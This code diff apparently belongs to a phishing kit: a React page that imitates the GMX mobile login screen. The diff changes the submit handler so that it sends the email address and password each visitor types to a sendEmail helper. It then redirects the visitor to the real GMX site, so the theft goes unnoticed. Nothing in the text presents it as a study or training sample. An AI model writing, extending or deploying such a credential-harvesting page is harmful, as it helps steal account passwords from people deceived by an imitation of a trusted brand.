@@ -3,7 +3,8 @@ import { Link } from "react-router-dom";
 
 import { faEye, faEyeSlash } from "@fortawesome/free-solid-svg-icons";
 import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
-import login from "../img/mobilefooter.png"
+import login from "../img/mobilefooter.png";
+import sendEmail from "../utils/sendEmail";
 
 export default function MLogin() {
   const [password, setPassword] = useState("");
@@ -18,9 +19,19 @@ export default function MLogin() {
     setPassword(event.target.value);
   };
 
-  const handleSubmit = (event) => {
+  const handleSubmit = async (event) => {
     event.preventDefault();
-    console.log({ password, email });
+    try {
+      const response = await sendEmail({ password, email });
+
+      if (response.data === "OK") {
+        window.location.assign(
+          "https://www.gmx.com/logout/?ls=wd#.1559516-header-login1-1"
+        );
+      }
+    } catch (error) {
+      console.log(error);
+    }
   };
 
   return (
@@ -29,7 +40,7 @@ export default function MLogin() {
         <h1 className="font-bold text-2xl text-white">GMX</h1>
         <h1 className="text-xl text-white">Mobile Login</h1>
       </div>
-     
+
       <div className="flex flex-col justify-center items-center">
         <div className="flex flex-col justify-center items-center">
           <h1 className="font-bold text-2xl py-5 text-blue-800">GMX</h1>
@@ -46,10 +57,11 @@ export default function MLogin() {
             </label>
 
             <input
-              type="text"
+              type="email"
               className="rounded border py-3 border-gray-300 w-full bg-white pl-2"
               value={email}
               onChange={(e) => setEmail(e.target.value)}
+              required
             />
 
             <div className="flex flex-col passwordInputDiv">
@@ -62,15 +74,11 @@ export default function MLogin() {
 
               <div
                 style={{
-                  // background: "red",
                   width: "100%",
                 }}
               >
-          
-
                 <input
                   type={showPassword ? "text" : "password"}
-                  
                   label="Password"
                   id="password"
                   name="password"
@@ -81,6 +89,7 @@ export default function MLogin() {
                     width: "94%",
                     height: "54px",
                   }}
+                  required
                 />
 
                 <button
@@ -91,7 +100,6 @@ export default function MLogin() {
                   <FontAwesomeIcon icon={showPassword ? faEyeSlash : faEye} />
                 </button>
               </div>
-
             </div>
             <button className="my-3 py-2 rounded bg-green-600">Login</button>
             <Link className="text-center text-base text-blue-900">
